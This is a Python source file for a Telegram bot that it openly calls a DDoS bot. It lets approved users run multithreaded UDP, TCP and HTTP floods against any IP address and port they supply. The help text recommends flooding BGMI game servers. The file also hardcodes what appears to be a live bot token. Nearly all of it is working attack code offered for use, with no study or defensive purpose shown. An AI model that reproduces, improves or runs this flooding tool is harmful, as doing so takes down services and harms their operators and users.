# bot.py - Railway DDoS Bot (100% Working)
import asyncio
import threading
import time
import random
import socket
import re
import os
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ============ CONFIG ============
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8278228198:AAG7C97c7R50_gsykoqBMwesCuoRZTciCLA")
ADMIN_IDS = [int(os.environ.get("ADMIN_ID", 8210011971))]

BLOCKED_PORTS = {22, 25, 443, 3389, 8700, 9031, 17500, 20000, 20001}

# Attack settings
ATTACK_THREADS = 80          # Railway safe
PACKET_SIZE = 512            # bytes
DELAY = 0.0001               # 0.1ms

# Global state
attack_active = False
attack_stats = {'packets': 0, 'target': '', 'method': '', 'start_time': 0, 'duration': 0}
stats_lock = threading.Lock()
user_data = {}

# ============ SIMPLE USER DB ============
USERS_FILE = "users.txt"
def is_approved(uid):
    if not os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'w') as f:
            f.write(str(ADMIN_IDS[0]))
        return True
    with open(USERS_FILE, 'r') as f:
        approved = f.read().split(',')
    return str(uid) in approved

def add_user(uid):
    with open(USERS_FILE, 'a') as f:
        f.write(f",{uid}")

# ============ ATTACK FUNCTIONS ============
def udp_attack(ip, port):
    global attack_active, attack_stats
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(PACKET_SIZE)
    while attack_active:
        try:
            sock.sendto(payload, (ip, port))
            with stats_lock:
                attack_stats['packets'] += 1
            time.sleep(DELAY)
        except:
            time.sleep(0.01)
    sock.close()

def tcp_attack(ip, port):
    global attack_active, attack_stats
    while attack_active:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.05)
            s.connect_ex((ip, port))
            s.close()
            with stats_lock:
                attack_stats['packets'] += 1
            time.sleep(DELAY)
        except:
            time.sleep(0.01)

def http_attack(ip, port):
    global attack_active, attack_stats
    url = f"http://{ip}:{port}"
    headers = {'User-Agent': 'Mozilla/5.0'}
    session = requests.Session()
    while attack_active:
        try:
            session.get(url, headers=headers, timeout=1)
            with stats_lock:
                attack_stats['packets'] += 1
            time.sleep(0.05)
        except:
            time.sleep(0.02)
    session.close()

# ============ ATTACK LAUNCHER ============
def start_attack(ip, port, duration, method, update_callback):
    global attack_active, attack_stats
    
    attack_active = True
    with stats_lock:
        attack_stats = {
            'packets': 0,
            'target': f"{ip}:{port}",
            'method': method,
            'start_time': time.time(),
            'duration': duration
        }
    
    # Choose function
    if method == 'udp':
        func = udp_attack
    elif method == 'tcp':
        func = tcp_attack
    else:
        func = http_attack
    
    # Start threads
    threads = []
    for _ in range(ATTACK_THREADS):
        t = threading.Thread(target=func, args=(ip, port), daemon=True)
        t.start()
        threads.append(t)
    
    # Monitor progress
    start = time.time()
    while attack_active and (time.time() - start) < duration:
        time.sleep(2)
        elapsed = int(time.time() - start)
        remaining = duration - elapsed
        with stats_lock:
            pkt = attack_stats['packets']
        speed = int(pkt / elapsed) if elapsed else 0
        bar = "█" * int(20 * elapsed / duration) + "░" * (20 - int(20 * elapsed / duration))
        msg = (
            f"💥 *ATTACK ACTIVE* 💥\n\n"
            f"🎯 `{ip}:{port}` | `{method.upper()}`\n"
            f"📦 Packets: `{pkt:,}`\n"
            f"⏱️ `{elapsed}/{duration}s`\n"
            f"📊 `[{bar}]`\n"
            f"💥 Speed: `{speed:,}` pps\n"
            f"🧵 Threads: `{ATTACK_THREADS}`"
        )
        update_callback(msg)
    
    # Attack finished
    attack_active = False
    for t in threads:
        t.join(0.5)
    with stats_lock:
        pkt = attack_stats['packets']
    avg = int(pkt / duration) if duration else 0
    update_callback(
        f"✅ *ATTACK COMPLETE*\n\n"
        f"🎯 `{ip}:{port}`\n"
        f"📦 Total packets: `{pkt:,}`\n"
        f"💥 Avg speed: `{avg:,}` pps"
    )

# ============ TELEGRAM HANDLERS ============
async def start(update, context):
    uid = update.effective_user.id
    if not is_approved(uid):
        await update.message.reply_text("❌ Not approved. Contact admin.")
        return
    user_data[uid] = {'step': 'ip'}
    await update.message.reply_text(
        "🔥 *DDoS Bot (Railway)* 🔥\n\n"
        "Send target IP:\nExample: `192.168.1.1`\n\n"
        f"⚙️ Threads: `{ATTACK_THREADS}`\n"
        f"🎮 *For BGMI:* Use UDP method on game port",
        parse_mode='Markdown'
    )

async def handle(update, context):
    uid = update.effective_user.id
    if not is_approved(uid):
        return
    text = update.message.text.strip()
    step = user_data.get(uid, {}).get('step')
    
    if step == 'ip':
        if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', text):
            await update.message.reply_text("Invalid IP. Send again:")
            return
        user_data[uid] = {'ip': text, 'step': 'port'}
        await update.message.reply_text(f"Send port (1-65535):\n🚫 Blocked: {', '.join(map(str, sorted(BLOCKED_PORTS)))}")
    
    elif step == 'port':
        try:
            port = int(text)
            if port < 1 or port > 65535 or port in BLOCKED_PORTS:
                raise ValueError
            user_data[uid]['port'] = port
            user_data[uid]['step'] = 'method'
            # Show method buttons
            kb = [
                [InlineKeyboardButton("🔥 UDP Flood", callback_data="m_udp")],
                [InlineKeyboardButton("💣 TCP Flood", callback_data="m_tcp")],
                [InlineKeyboardButton("🌐 HTTP Flood", callback_data="m_http")],
                [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
            ]
            await update.message.reply_text("Select attack method:", reply_markup=InlineKeyboardMarkup(kb))
        except:
            await update.message.reply_text("Invalid port. Try again:")
    
    elif step == 'duration':
        try:
            duration = int(text)
            if duration < 5 or duration > 300:
                raise ValueError
            ip = user_data[uid]['ip']
            port = user_data[uid]['port']
            method = user_data[uid]['method']
            del user_data[uid]
            # Confirm and start
            kb = [[InlineKeyboardButton("✅ START ATTACK", callback_data=f"start_{ip}_{port}_{duration}_{method}")],
                  [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]]
            await update.message.reply_text(
                f"🔥 *Confirm Attack*\n\n"
                f"🎯 `{ip}:{port}`\n"
                f"⚙️ Method: `{method.upper()}`\n"
                f"⏱️ Duration: `{duration}s`\n\n"
                f"Start?",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(kb)
            )
        except:
            await update.message.reply_text("Duration 5-300 seconds:")
    
    else:
        await update.message.reply_text("Send /start")

async def button(update, context):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    data = query.data
    
    if data == "cancel":
        if uid in user_data:
            del user_data[uid]
        await query.edit_message_text("❌ Cancelled")
        return
    
    if data.startswith("m_"):
        method = data[2:]  # udp, tcp, http
        if uid not in user_data:
            user_data[uid] = {}
        user_data[uid]['method'] = method
        user_data[uid]['step'] = 'duration'
        await query.edit_message_text(f"✅ Method: `{method.upper()}`\n\nSend duration (5-300 seconds):", parse_mode='Markdown')
        return
    
    if data.startswith("start_"):
        _, ip, port, duration, method = data.split("_")
        port = int(port)
        duration = int(duration)
        # Clean user data
        if uid in user_data:
            del user_data[uid]
        # Send initial message
        await query.edit_message_text(f"🚀 *Launching attack on {ip}:{port}*\nMethod: {method.upper()}\nDuration: {duration}s\n\n_Sending packets..._", parse_mode='Markdown')
        # Callback for updates
        loop = asyncio.get_event_loop()
        def send_update(msg):
            asyncio.run_coroutine_threadsafe(query.message.reply_text(msg, parse_mode='Markdown'), loop)
        # Start attack in thread
        threading.Thread(target=start_attack, args=(ip, port, duration, method, send_update), daemon=True).start()
        return
    
    # Attack control buttons (shown during attack)
    if data == "stop":
        global attack_active
        attack_active = False
        await query.edit_message_text("🛑 Attack stopped")
    elif data == "info":
        if attack_active:
            with stats_lock:
                pkt = attack_stats['packets']
                elapsed = int(time.time() - attack_stats['start_time'])
                remaining = attack_stats['duration'] - elapsed
                speed = int(pkt / elapsed) if elapsed else 0
                await query.edit_message_text(
                    f"ℹ️ *Info*\n\n📦 Packets: `{pkt:,}`\n⏱️ Remaining: `{remaining}s`\n💥 Speed: `{speed:,}` pps",
                    parse_mode='Markdown'
                )
        else:
            await query.answer("No active attack")
    elif data == "refresh":
        if attack_active:
            with stats_lock:
                pkt = attack_stats['packets']
                elapsed = int(time.time() - attack_stats['start_time'])
                remaining = attack_stats['duration'] - elapsed
                prog = int(20 * elapsed / attack_stats['duration'])
                bar = "█" * prog + "░" * (20 - prog)
                speed = int(pkt / elapsed) if elapsed else 0
                text = (
                    f"💥 *ATTACK ACTIVE*\n\n"
                    f"🎯 `{attack_stats['target']}`\n"
                    f"📦 `{pkt:,}` pkts\n"
                    f"⏱️ `{elapsed}/{attack_stats['duration']}s`\n"
                    f"📊 `[{bar}]`\n"
                    f"💥 `{speed:,}` pps"
                )
                kb = [[InlineKeyboardButton("🛑 STOP", callback_data="stop")],
                      [InlineKeyboardButton("ℹ️ INFO", callback_data="info"), InlineKeyboardButton("🔄 REFRESH", callback_data="refresh")]]
                await query.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(kb))
        else:
            await query.edit_message_text("✅ No attack")

async def stop_cmd(update, context):
    global attack_active
    attack_active = False
    await update.message.reply_text("🛑 Attack stopped")

async def power(update, context):
    global ATTACK_THREADS
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("Unauthorized")
        return
    if context.args:
        try:
            t = int(context.args[0])
            if 10 <= t <= 150:
                ATTACK_THREADS = t
                await update.message.reply_text(f"✅ Threads set to {t}")
            else:
                await update.message.reply_text("Use 10-150")
        except:
            await update.message.reply_text("Invalid")
    else:
        await update.message.reply_text(f"Current threads: {ATTACK_THREADS}")

async def myinfo(update, context):
    uid = update.effective_user.id
    status = "✅ Approved" if is_approved(uid) else "❌ Not"
    await update.message.reply_text(f"📋 *Account*\n\n🆔 `{uid}`\n{status}", parse_mode='Markdown')

async def blocked(update, context):
    await update.message.reply_text(f"🚫 Blocked ports: {', '.join(map(str, sorted(BLOCKED_PORTS)))}")

async def help_cmd(update, context):
    await update.message.reply_text(
        "🤖 *Commands*\n"
        "/start – Setup attack\n"
        "/stop – Stop attack\n"
        "/power <10-150> – Set threads\n"
        "/myinfo – Account\n"
        "/blockedports – Blocked list\n"
        "/help – This menu\n\n"
        "*For BGMI:* Use UDP method on game port (e.g., 8080).",
        parse_mode='Markdown'
    )

async def error(update, context):
    print(f"Error: {context.error}")

def main():
    print("🚀 Starting DDoS Bot on Railway...")
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("power", power))
    app.add_handler(CommandHandler("myinfo", myinfo))
    app.add_handler(CommandHandler("blockedports", blocked))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle))
    app.add_error_handler(error)
    print("✅ Bot LIVE! Send /start")
    app.run_polling()

if __name__ == "__main__":
    main()
